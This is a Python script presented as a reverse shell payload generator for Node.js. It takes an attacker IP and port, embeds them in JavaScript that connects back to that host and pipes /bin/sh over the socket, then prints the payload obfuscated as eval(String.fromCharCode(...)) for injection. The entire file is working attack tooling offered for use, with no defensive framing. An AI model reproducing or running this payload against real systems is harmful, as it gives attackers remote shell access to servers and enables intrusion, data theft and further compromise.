#!/usr/bin/python3

import os
import sys


class bcolors:
    GREEN = '\033[92m'  
    YELLOW = '\033[93m' 
    BLUE = '\033[94m'   
    RED = '\033[91m'   
    WHITE = '\033[0m'    
    ENDC = '\033[0m' 



banner = """
.%%..%%...%%%%...%%%%%...%%%%%%..%%%%%%...%%%%...%%..%%..%%%%%%..%%......%%.....
.%%%.%%..%%..%%..%%..%%..%%..........%%..%%......%%..%%..%%......%%......%%.....
.%%.%%%..%%..%%..%%..%%..%%%%........%%...%%%%...%%%%%%..%%%%....%%......%%.....
.%%..%%..%%..%%..%%..%%..%%......%%..%%......%%..%%..%%..%%......%%......%%.....
.%%..%%...%%%%...%%%%%...%%%%%%...%%%%....%%%%...%%..%%..%%%%%%..%%%%%%..%%%%%%.
................................................................................
[+]Reverse_shell payload generator for NodeJS

"""
usage = f"""
Usage  :{sys.argv[0]} <Attacker_IP> <Port>
Example:{sys.argv[0]} 192.168.0.5 1337
"""

print(bcolors.GREEN,banner,bcolors.ENDC)


if len(sys.argv) != 3:
    print(bcolors.RED,"[!]NeedMoreArgs!!!!")
    print(usage,bcolors.ENDC)

    sys.exit()


IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]
print(bcolors.BLUE)
print(f"[+] LHOST: {IP_ADDR}")
print(f"[+] LPORT: {PORT}")
print(bcolors.ENDC)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print(bcolors.GREEN,"[+]Done!!!!!!!!")
print(bcolors.BLUE,"[+]Genereted: ",bcolors.ENDC)
payload = charencode(NODEJS_REV_SHELL)
print("feval(String.fromCharCode(%s))" % (payload))
print(bcolors.ENDC)
